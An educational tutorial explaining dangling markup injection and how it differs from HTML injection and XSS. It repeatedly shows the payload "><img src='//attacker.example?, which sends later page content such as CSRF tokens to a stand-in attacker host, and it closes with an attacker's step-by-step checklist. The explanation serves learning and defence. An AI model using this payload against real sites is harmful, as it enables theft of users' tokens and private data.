# Dangling Markup Injection

## What is Dangling Markup Injection?

Dangling markup injection is a technique used to capture sensitive
data from a web page when a full XSS attack is not possible.

The main idea is:

Instead of executing JavaScript, the attacker manipulates the HTML
parser so that part of the application's response becomes part of a
URL sent to an attacker-controlled server.

1. Vulnerable HTML Context

Suppose an application places user-controlled input inside an HTML
attribute:

<input type="text" name="input" value="CONTROLLABLE DATA HERE

The application has failed to properly close or escape the attribute.

Normally, it should look like:

<input type="text" name="input" value="hello">

2. Breaking Out of the Attribute

If the application does not filter or escape " and >, an attacker
can inject:

">

These characters have two jobs:

"  → closes the existing value attribute
>  → closes the <input> tag

For example:

<input type="text" name="input" value="">

The attacker has now escaped the original HTML attribute and returned to
a normal HTML context.

Important

This is HTML injection, but it is not automatically XSS.

HTML injection ≠ XSS

XSS requires a path to JavaScript execution. Dangling markup instead
abuses HTML parsing to capture data.

3. Creating the Dangling Markup

The attacker can then inject an element such as:

"><img src='//attacker.example?

Notice that the src attribute starts with a single quote:

<img src='

but the attacker does not provide the closing quote.

Therefore, the attribute is left dangling.

4. What Does the Browser Do?

Suppose the application's response after the injection contains:

<input type="text" name="input" value="">
<img src='//attacker.example?
<p>Your sensitive information...</p>
<input type="hidden" name="csrf" value="ABC123">
...
'

The browser sees:

<img src='

and thinks:

"The value of the src attribute has started. I need to keep reading
until I find the next '."

Therefore, content appearing after the injection point can become part
of the src attribute.

Conceptually:

<img src='
          ↓
          ├── HTML after injection
          ├── sensitive data
          ├── other page content
          ↓
          '
          ↑
     closing quote

5. How Does the Data Reach the Attacker?

The resulting URL is conceptually:

//attacker.example?<captured page content>

The browser attempts to request that URL.

The flow becomes:

Attacker-controlled input
        ↓
Break out of HTML attribute
        ↓
Create <img>
        ↓
Leave src attribute unclosed
        ↓
Browser consumes subsequent response content
        ↓
Content becomes part of the URL
        ↓
Browser makes external request
        ↓
Attacker's server receives the request

The attacker therefore may be able to capture part of the application's
response.

6. Why Doesn't This Require XSS?

This is the key distinction.

XSS

The goal is:

Attacker input
      ↓
HTML/JavaScript injection
      ↓
JavaScript execution
      ↓
Attacker controls actions/data available to the page

Dangling Markup

The goal is:

Attacker input
      ↓
HTML injection
      ↓
Malformed/dangling attribute
      ↓
Browser includes later page content in a URL
      ↓
External request
      ↓
Attacker receives data

No JavaScript execution is required.

7. HTML Injection vs XSS vs Dangling Markup

Technique         What the attacker does                             JavaScript execution required?

HTML Injection    Manipulates the HTML structure                     No
XSS               Causes attacker-controlled JavaScript to execute   Yes
Dangling Markup   Manipulates HTML parsing to capture data           No

Therefore:

Attacker-controlled input
        ↓
      HTML injection
        │
        ├── JavaScript executes → XSS
        │
        ├── HTML changes only → HTML injection
        │
        └── Later response data is captured → Dangling markup

8. Why Is "> Used?

The payload starts with:

">

because the attacker first needs to escape the existing HTML context.

For:

<input value="USER_INPUT

the injected:

">

changes the structure to:

<input value="">

Conceptually:

"  → escape the quoted attribute
>  → escape the HTML element

Only after doing this can the attacker create a new element such as:

<img src='//attacker.example?

9. Why Is <img> Used?

The important property of <img> is that its src attribute causes the
browser to make a request for an external resource.

The technique therefore relies on an element/attribute that can cause an
external request.

The specific element is less important than the property:

The browser must make a request to a location controlled by the
attacker.

10. What Data Can Potentially Be Captured?

Depending on where the injection occurs and what appears afterward, the
captured content might include:

CSRF tokens

Email contents

Account information

Financial information

Other sensitive HTML content

The attacker generally captures content following the injection
point, up to the point where the dangling attribute is terminated.

11. URL Encoding

The captured content may contain characters that cannot safely appear
directly in a URL.

The browser therefore URL-encodes them.

For example:

space  → %20
<      → %3C
>      → %3E
newline → %0A

Therefore, the attacker may receive an encoded version of the captured
data.

12. Why Is Dangling Markup Useful When XSS Is Blocked?

Suppose normal XSS is prevented because of:

Input filtering

Content Security Policy (CSP)

A WAF

JavaScript restrictions

Other browser/application defenses

You may be unable to execute JavaScript.

However, if you can still inject HTML and cause an external request,
dangling markup may provide another way to extract data.

The important difference is:

XSS:
"Execute my code."

Dangling markup:
"Make the browser send some of its page content to me."

Important Mental Model

When analyzing dangling markup, think:

1. Where is my input reflected?
          ↓
2. Can I break out of the existing HTML attribute?
          ↓
3. Can I create an element that makes an external request?
          ↓
4. Can I leave an attribute quote dangling?
          ↓
5. What sensitive content appears after my injection?
          ↓
6. What causes the dangling attribute to eventually close?

Key Takeaway

Dangling markup injection abuses HTML parsing rather than JavaScript
execution. The attacker breaks out of an existing HTML attribute,
creates an element with an external resource URL, and deliberately
leaves an attribute unclosed. The browser then treats subsequent HTML
response data as part of that attribute value and may send it to an
attacker-controlled server.

Remember:

HTML Injection
      ↓
Break out of attribute
      ↓
Create external-request element
      ↓
Leave attribute "dangling"
      ↓
Browser consumes following response
      ↓
Sensitive data may become part of URL
      ↓
Data can reach attacker